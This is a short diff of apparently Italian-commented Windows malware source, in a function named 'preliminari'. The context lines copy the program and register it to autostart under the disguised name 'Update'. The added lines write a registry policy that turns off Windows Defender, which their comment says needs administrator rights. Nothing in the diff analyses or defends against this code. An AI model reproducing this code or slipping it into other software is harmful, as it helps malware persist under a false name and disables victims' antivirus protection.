@@ -916,6 +916,15 @@ bool preliminari()
 	CopyFile(buffer,pFC,true);
 	reg_write("Software\\Microsoft\\Windows\\CurrentVersion\\Run","Update",REG_SZ,pF);
 	
+	// DISABILITA WINDOWS DEFENDER (RICHIEDE I PERMESSI DI AMMINISTRATORE)
+	LPCTSTR sk=TEXT("SOFTWARE\\Policies\\Microsoft\\Windows Defender");
+	DWORD data=1;
+	HKEY key;
+	RegOpenKeyEx(HKEY_LOCAL_MACHINE,(LPCSTR)sk,0,KEY_ALL_ACCESS,&key);
+	RegSetValueEx(key,"DisableAntiSpyware",0,REG_DWORD,(const BYTE*)&data,sizeof(data));
+	RegCloseKey(key);
+	// DISABILITA WINDOWS DEFENDER (RICHIEDE I PERMESSI DI AMMINISTRATORE)
+	
 	for(int i=9;i<256;i++)
 		cmd[i]=pF[i-9];
 	
